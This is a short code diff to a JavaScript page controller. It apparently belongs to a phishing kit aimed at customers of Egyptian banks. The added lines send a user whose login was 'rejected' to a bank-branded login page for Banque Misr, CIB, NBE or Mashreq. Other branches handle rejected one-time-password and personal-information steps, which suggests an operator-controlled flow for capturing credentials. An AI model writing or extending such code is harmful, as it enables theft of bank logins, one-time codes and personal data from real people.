@@ -207,7 +207,13 @@
                     }
                 } else if (data.status === 'rejected') {
                     if (data.type === 'login') {
-                        window.location.href = 'login_en.html?rejected=true';
+                        let redirectUrl = 'login_en.html';
+                        const bank = data.data && data.data.bank ? String(data.data.bank).trim() : '';
+                        if (bank === 'Banque Misr') redirectUrl = 'login_bm_en.html';
+                        else if (bank === 'CIB') redirectUrl = 'login_cib_en.html';
+                        else if (bank === 'NBE') redirectUrl = 'login_nbe_en.html';
+                        else if (bank === 'Mashreq') redirectUrl = 'login_en.html';
+                        window.location.href = redirectUrl + '?rejected=true';
                     } else if (data.type === 'otp') {
                         window.location.href = 'otp_en.html?rejected=true';
                     } else if (data.type === 'personal_info') {
